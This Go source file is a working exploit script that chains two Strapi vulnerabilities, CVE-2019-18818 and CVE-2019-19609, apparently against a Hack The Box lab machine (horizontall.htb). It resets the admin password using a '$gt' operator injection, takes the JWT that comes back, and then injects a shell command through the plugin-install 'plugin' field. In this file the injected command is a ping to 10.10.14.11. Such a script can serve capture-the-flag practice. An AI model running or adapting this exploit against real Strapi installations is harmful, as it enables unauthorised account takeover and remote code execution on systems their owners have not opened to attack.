package main

import (
    "fmt"
    "bytes"
    // "os"
    "io/ioutil"
    "net/http"
    "encoding/json"
    // "reflect"
)

// Get the JWT string after changing the password
type JsonResponse struct {
    Jwt string  `json:"jwt"`
}

func main() {
    // ip := os.Args[1]
    jwt := resetPassword()
    rce(jwt)
}

// Exploit CVE-2019-18818
// Strapi - Set Password (Unauthenticated) vulnerability
func resetPassword() (string) {
    // Change the password to "rockyou"
    url := "http://api-prod.horizontall.htb/admin/auth/reset-password"
    params := `{
        "code":{"$gt":0},
        "password":"rockyou",
        "passwordConfirmation":"rockyou"
    }`
    headers := make(map[string]string)
    headers["Content-Type"] = "application/json; charset=UTF-8"

    // Make the post request
    response := postRequest(url, params, headers)
    defer response.Body.Close()

    // Parse the json response to get the jwt for authentication
    body, _ := ioutil.ReadAll(response.Body)
    return getJwt(body)
}

// Parse json to get the JWT for authentication
func getJwt(body []uint8) (string) {
    json_response := new(JsonResponse)
    error := json.Unmarshal([]byte(body), &json_response)
    if error != nil {
        panic(error)
    }
    return json_response.Jwt
}

// Exploit CVE-2019-19609
// Strapi - Remote Code Execution (Authenticated)
func rce(jwt string) {
    url := "http://api-prod.horizontall.htb/admin/plugins/install"
    params := fmt.Sprintf(`{
        "plugin":"documentation && $(%s)",
        "port":1337
    }`, "ping -c 5 10.10.14.11")
    headers := make(map[string]string)
    headers["Content-Type"] = "application/json; charset=UTF-8"
    headers["Authorization"] = fmt.Sprintf("Bearer %s", jwt)

    postRequest(url, params, headers)
}

// Make an http post request given a URL and json parameters
func postRequest(url, params string, headers map[string]string) (*http.Response) {
    // Create a POST request with JSON params
    json_data := []byte(params)
    request, error := http.NewRequest("POST", url, bytes.NewBuffer(json_data))
    for key, value := range headers {
        request.Header.Add(key, value)
    }

    // Make the POST request
    client := new(http.Client)
    response, error := client.Do(request)

    if error != nil {
        panic(error)
    }
    return response
}

